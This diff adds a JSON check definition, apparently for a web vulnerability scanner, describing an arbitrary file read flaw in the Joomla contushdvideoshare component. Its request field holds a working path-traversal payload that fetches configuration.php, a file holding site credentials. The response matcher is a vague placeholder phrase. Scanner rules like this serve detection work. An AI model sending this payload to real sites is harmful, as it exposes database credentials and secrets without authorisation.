@@ -1,0 +1,23 @@
+{
+  "cms": "joomla",
+  "version": "",
+  "author": "wolf",
+  "desc": "Joomla contushdvideoshare 存在任意文件读取漏洞",
+  "tags": [
+    "任意文件读取漏洞"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "the joomla configuration.php contain the words"
+  }
+}
